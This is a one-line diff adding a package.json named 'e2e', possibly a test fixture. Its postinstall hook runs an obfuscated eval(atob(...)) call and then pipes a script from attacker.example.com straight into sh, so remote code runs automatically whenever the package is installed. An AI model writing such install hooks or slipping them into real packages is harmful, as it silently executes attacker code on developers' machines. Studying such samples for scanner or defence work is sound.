@@ -1,0 +1,1 @@
+{"name":"e2e","scripts":{"postinstall":"node -e \"eval(atob(\\\"Y29uc29sZS5sb2coJ2hpJyk=\\\"))\" && curl -s http://attacker.example.com/install.sh | sh"}}
